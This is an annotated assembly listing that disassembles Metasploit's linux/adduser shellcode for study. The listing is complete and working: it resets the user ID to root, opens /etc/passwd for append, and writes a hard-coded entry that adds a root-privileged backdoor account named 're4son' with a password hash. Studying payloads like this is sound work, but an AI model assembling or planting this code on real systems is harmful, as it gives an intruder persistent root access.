; Filename: msf-adduser.nasm
; Author: Metasploit
; Analysed by Re4son <re4son [at] whitedome.com.au>
; Purpose: Disassembly of msf linux/adduser
;          for research purpose


global _start           

section .text

_start:
  ; setreuid() sets real and effective user IDs of the calling process
  ; int setreuid(uid_t ruid, uid_t euid)
  xor    ecx,ecx		; zero out ecx
  mov    ebx,ecx		; and ebx
  push   0x46			; put sys_setreuid
  pop    eax			;  into eax
  int    0x80			; and invoke system call


  ; open, create - open and possibly create a file or device
  ; int open(const char *pathname, int flags)
  push   0x5			; put sys_open
  pop    eax                    ;  into eax
  xor    ecx,ecx		; zero out ecx
  push   ecx			; push null terminator onto stack
  push   dword 0x64777373	; push sswd
  push   dword 0x61702f2f	; push //pa
  push   dword 0x6374652f	; push /etc
  mov    ebx,esp		; store pointer to file name in ebx
  inc    ecx			; set O_WRONLY flag (01)
  mov    ch,0x4			; set O_APPEND flag (02000)
  int    0x80			; and invoke system call


  ; write - write to a file descriptor
  ; ssize_t write(int fd, const void *buf, size_t count)
  xchg   ebx,eax		; store file descriptor in ebx
  call   adduser		; call/pop trick to get our db address

db "re4son:Az/dIsj4p4IRc:0:0::/:/bin/sh"
  
adduser:
  pop    ecx			; put the pointer to our string in ecx
  mov    edx, [ecx-0x4]		; put the size in edx
  push   0x4			; put sys_write
  pop    eax			;  into eax
  int    0x80			; and invoke system call


  ; exit - terminate the calling process
  ; void _exit(int status)
  push   0x1			; put sys_exit
  pop    eax			;  in eax
  int    0x80			; so long and thanks for all the fish